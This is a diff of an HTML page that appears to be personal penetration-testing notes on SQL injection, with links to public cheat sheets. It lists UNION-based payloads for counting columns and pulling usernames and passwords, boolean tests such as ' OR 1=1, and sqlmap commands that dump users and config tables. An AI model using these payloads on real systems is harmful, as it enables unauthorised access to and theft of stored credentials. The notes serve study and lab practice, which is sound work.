@@ -64,11 +64,11 @@
 
             <div class="nav__btns">
                 <!--Theme change button-->
-                <i class="uil uil-moon change-theme" id="theme-button"></i>
+                <!-- <i class="uil uil-moon change-theme" id="theme-button"></i>
 
                 <div class="nav__toggle" id="nav-toggle">
                     <i class="uil uil-apps"></i>
-                </div>
+                </div> -->
             </div>
         </nav>
     </header>
@@ -78,17 +78,15 @@
 <!--==================== MAIN ====================-->
     <main class="main"><article id="57796682-48fc-41f9-a174-e20862211526" class="page sans"><header><h1 class="page-title">SQL Injection</h1></header><div class="page-body"><p id="3d7525e4-ae3d-40ef-b8b5-416cba4b62e4" class=""><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">https://portswigger.net/web-security/sql-injection/cheat-sheet</a></p><p id="133cd415-8978-4603-956f-7319f680ba74" class="">MSSQL Guides</p><ul id="988758eb-d727-499d-9c3c-4ecee87bcefa" class="bulleted-list"><li style="list-style-type:disc"><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md#mssql-error-based">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL Injection/MSSQL Injection.md</a></li></ul><ul id="e23fcebb-6bc3-4b7e-b249-3c194b9a3cb1" class="bulleted-list"><li style="list-style-type:disc"><a href="https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/">https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/</a></li></ul><p id="769cf107-c669-4071-94cd-3673b152fbcc" class="">MySQL Guides</p><ul id="54fd178b-36ca-4618-bd19-5ad5f934ddc5" class="bulleted-list"><li style="list-style-type:disc"><a href="https://github.com/payloadbox/sql-injection-payload-list">https://github.com/payloadbox/sql-injection-payload-list</a></li></ul><p id="230ea91e-17cd-4040-b1b9-d5087598153f" class="">
 </p><p id="f41671d6-fee8-4c42-915b-81863e1b4d6f" class="">Payloads:</p><pre id="bd55c2e3-27de-45d1-8f31-92b05661c148" class="code"><code>possible statements being used
-SELEC</code></pre><p id="03cc1ae7-e67d-4db9-8eab-289539e95e7e" class="">
+SELECT</code></pre><p id="03cc1ae7-e67d-4db9-8eab-289539e95e7e" class="">
 </p><p id="415321b9-dd33-4c80-a498-b33c60e3670f" class=""><strong>SQLi UNION attack determining the number of columns:</strong></p><pre id="8d134ee0-d69c-4a79-8eea-482dd0fefd55" class="code"><code>&#x27; UNION SELECT NULL--
 &#x27; UNION SELECT NULL, NULL--
 &#x27; UNION SELECT NULL, NULL, NULL--
 
 &#x27; ORDER BY 1--
 &#x27; ORDER BY 2--
-&#x27; ORDER BY 3--</code></pre><p id="eb96a37f-8be4-42c1-8742-93c8166b7030" class=""><strong>SQL injection UNION attack, finding a column containing text:</strong></p><pre id="d1e4c982-120b-494b-b8d8-bfaa8ec8607b" class="code"><code>&#x27; UNION SELECT NULL, &#x27;a&#x27;, NULL--
-</code></pre><p id="b830205d-de05-4de5-a286-e5c6a0ed45c5" class="">
-</p><p id="16419179-9025-4803-a71e-ad2d14a95e4f" class=""><strong>SQL injection UNION attack, retrieving data from other tables:</strong></p><pre id="9e2e8193-d0a7-4988-bd8d-a4f5e7dfe656" class="code"><code>&#x27; UNION SELECT username, password, from users--
-</code></pre><p id="27268138-3576-4bf8-847e-5db6dbf2a92d" class="">
+&#x27; ORDER BY 3--</code></pre><p id="eb96a37f-8be4-42c1-8742-93c8166b7030" class=""><strong>SQL injection UNION attack, finding a column containing text:</strong></p><pre id="d1e4c982-120b-494b-b8d8-bfaa8ec8607b" class="code"><code>&#x27; UNION SELECT NULL, &#x27;a&#x27;, NULL--</code></pre><p id="b830205d-de05-4de5-a286-e5c6a0ed45c5" class="">
+</p><p id="16419179-9025-4803-a71e-ad2d14a95e4f" class=""><strong>SQL injection UNION attack, retrieving data from other tables:</strong></p><pre id="9e2e8193-d0a7-4988-bd8d-a4f5e7dfe656" class="code"><code>&#x27; UNION SELECT username, password, from users--</code></pre><p id="27268138-3576-4bf8-847e-5db6dbf2a92d" class="">
 </p><p id="212ec274-fa87-4326-b52c-581783857bce" class=""><strong>Retrieving multiple values in a single column with Union Attacks:</strong></p><pre id="fdf4a743-587d-4a42-9e83-6a992692f391" class="code"><code>&#x27; UNION SELECT NULL, username || password from users--</code></pre><p id="78612ef9-3df3-4f2d-b84f-212aeefc2f13" class="">
 </p><p id="f435c81f-3b4f-4bf9-bf0b-928d1d5af4ab" class=""><strong>Listing content on non-oracle databases:</strong></p><pre id="453a4213-9986-4dba-bf05-f8b847af2291" class="code"><code>#1. Determine the number of columns
 &#x27; order by 1--
@@ -121,27 +119,21 @@ SELEC</code></pre><p id="03cc1ae7-e67d-4db9-8eab-289539e95e7e" class="">
 #5. Output columns names frmo table
 &#x27; UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = &#x27;TABLE_NAME_HERE&#x27;--
 #6. Output list of users and passwords
-&#x27; UNION SELECT users, passwords FROM users_table_name--</code></pre><p id="5a67e3b1-c453-46c5-8aae-6a9c8451e6fc" class="">DATABASE COMMANDS:</p><p id="d6b8160c-3a6e-4cf4-8ad0-60acf509fd50" class="">MSSQL:</p><pre id="863251af-c583-4384-b1c9-bf3b75769a86" class="code"><code>sqsh -S server_name -U username -P password
+&#x27; UNION SELECT users, passwords FROM users_table_name--</code></pre><p id="56520366-132b-42ba-870a-fd5e0eac6456" class="">
+</p><pre id="76e1c076-947f-4849-8b0a-9d8f3d45e947" class="code"><code>#All items should be shown
+‘ AND ‘a’=’a
+#No items should be shown
+‘ AND ‘a’=’b
 
-proxychains4 impacket-mssqlclient sa:pass@0.0.0.0
-
-SELECT name FROM sys.databases;
-
-use database;
-
-SELECT name FROM sys.tables;
-
-SELECT * FROM Customer;</code></pre><p id="d2c3bc42-3fa2-4d48-a43b-c7716b2d33e6" class="">
-</p><p id="56520366-132b-42ba-870a-fd5e0eac6456" class="">
-</p><p id="52d8fdb6-29f2-4723-8ede-420ac510c46c" class="">
-</p><p id="10b902bd-ca4d-4dee-9b46-d2925dd05cb0" class="">SQLMAP:</p><pre id="493fb852-e2d0-4e84-bd15-ba6bf069f132" class="code"><code>sqlmap -r /home/parallels/Desktop/request.txt --dbs
+&#x27; OR 1=1 LIMIT 1 --
+&#x27; OR 1=1 OFFSET 1 --</code></pre><p id="10b902bd-ca4d-4dee-9b46-d2925dd05cb0" class="">SQLMAP:</p><pre id="493fb852-e2d0-4e84-bd15-ba6bf069f132" class="code"><code>sqlmap -r /home/parallels/Desktop/request.txt --dbs
 sqlmap -r /home/parallels/Desktop/request.txt -D information_schema --tables
 sqlmap -r /home/parallels/Desktop/request.txt -D blog --tables
 sqlmap -r /home/parallels/Desktop/request.txt -D blog -T users --dump
 sqlmap -r /home/parallels/Desktop/request.txt -D blog -T config --dump</code></pre><p id="a16dbefc-6131-476a-b5a2-09e841b5f0af" class="">
 </p><p id="05c72816-8181-459f-89c1-82575ce722a8" class=""><strong>BLIND SQL INJECTIONS:</strong></p><p id="73bece07-562a-45d1-a13d-6b2d993f9c8f" class="">Blind SQL Injection with conditional responses:</p><pre id="79588e17-1e4e-42dc-929d-d2a434fc3b35" class="code"><code>#TODO</code></pre><p id="3432eabe-f913-419c-9b74-8daabda2f293" class="">
 </p><p id="b3b1584a-f46f-4acf-af2e-915c68709b28" class="">Blind SQL Injection with conditional errors:</p><pre id="d6e24448-67a9-4f57-b0b8-ae577dc913d7" class="code"><code>#TODO</code></pre><p id="40070f7e-395a-4a28-9262-15449702c28b" class="">Blind SQL Injection with time delays:</p><pre id="23290e6b-5515-4990-b8f2-f848f66b3b9c" class="code"><code>#TODO</code></pre><p id="c9c0372c-4aac-476b-8e43-60524b7fa878" class="">Blind SQL Injection Out of band:</p><pre id="c7043e66-2c2c-4836-8382-62a4b900ec21" class="code"><code>#TODO</code></pre><p id="f1bcc6ff-8398-4654-bd74-410d77d01a93" class="">
-</p><figure id="119bc08c-59b1-491a-84dd-e6fedb6467ed" class="link-to-page"><a href="SQL%20Injection%205779668248fc41f9a174e20862211526/SQL%20Injection%20119bc08c59b1491a84dde6fedb6467ed.html">SQL Injection</a></figure></div></article></main></main>
+</p></div></article></main></main>
 
     <!--==================== FOOTER ====================-->
     <footer class="footer">
